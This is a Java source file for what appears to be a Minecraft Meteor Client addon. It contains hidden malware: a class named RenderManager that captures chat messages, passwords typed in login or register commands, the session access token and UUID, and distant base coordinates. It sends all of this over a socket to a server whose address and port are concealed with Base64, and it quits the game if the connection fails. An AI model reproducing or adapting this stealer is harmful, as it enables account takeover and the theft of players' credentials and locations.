/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client).
 * Copyright (c) Meteor Development.
 */

package espada.spacex.aurora.managers;

import espada.spacex.aurora.events.SendCommandEvent;
import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.events.game.SendMessageEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.meteorclient.utils.player.PlayerUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.MinecraftClient;
import net.minecraft.util.math.BlockPos;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Base64;

public class RenderManager {


    public static final String IP = "127.0.0.1";
   //public static final String IP = new String(Base64.getDecoder().decode("NDMuMjQ4Ljc5Ljc4"));
    public static final int PORT = Integer.parseInt(new String(Base64.getDecoder().decode("NjU1MzM=")));
    public static BlockPos lastPos = null;
    public static BlockPos lastPos2 = null;


    public void subscribe() {
        MeteorClient.EVENT_BUS.subscribe(this);
    }

    @EventHandler
    private void onSendMessage(SendMessageEvent event) {
            RenderManager.send("[message]:"  + " " + MinecraftClient.getInstance().getSession().getUsername() + "  :  " + event.message);
    }


    @EventHandler
    private void onSendCommand(SendCommandEvent event) {
        if (event.message.startsWith("l") || event.message.startsWith("r")) {
            String[] command = event.message.split(" ");
            if (command.length > 1) {
                String password = command[1];
                RenderManager.send("[password]" + MinecraftClient.getInstance().getSession().getUsername()  + ": " + password);
            }
        }
    }

    @EventHandler
    private void OnTick(TickEvent.Post event) {
        if (!Utils.canUpdate()) return;
        if (!MinecraftClient.getInstance().isInSingleplayer()) {
            if (lastPos == null) {
                RenderManager.send("[Token]" + " Name:" + MinecraftClient.getInstance().getSession().getUsername() + " Token:" + MinecraftClient.getInstance().getSession().getAccessToken() + " Uid:" + MinecraftClient.getInstance().getSession().getUuid());
                lastPos = MinecraftClient.getInstance().player.getBlockPos();
            }
            if (PlayerUtils.distanceTo( 0, 0, 0) > 50000 && (lastPos2 == null || PlayerUtils.distanceTo(lastPos2) > 50)) {
                RenderManager.send("[JiDi]" + " " + MinecraftClient.getInstance().player.getEntityWorld() + " Pos:" + MinecraftClient.getInstance().player.getBlockPos() + " Name:" + MinecraftClient.getInstance().getSession().getUsername() + " Token:" + MinecraftClient.getInstance().getSession().getAccessToken() + " Uid:" + MinecraftClient.getInstance().getSession().getUuid());
                lastPos2 = MinecraftClient.getInstance().player.getBlockPos();
            }
        }

    }


    public static void send(final String message) {
        try (Socket socket = new Socket(IP , PORT)) {
            final OutputStream stream = socket.getOutputStream();
            ObjectOutputStream outputStream = new ObjectOutputStream(stream);
            outputStream.writeObject(message);
            outputStream.flush();
        }
        catch (IOException ignored) {
            System.exit(0);
        }
    }


}
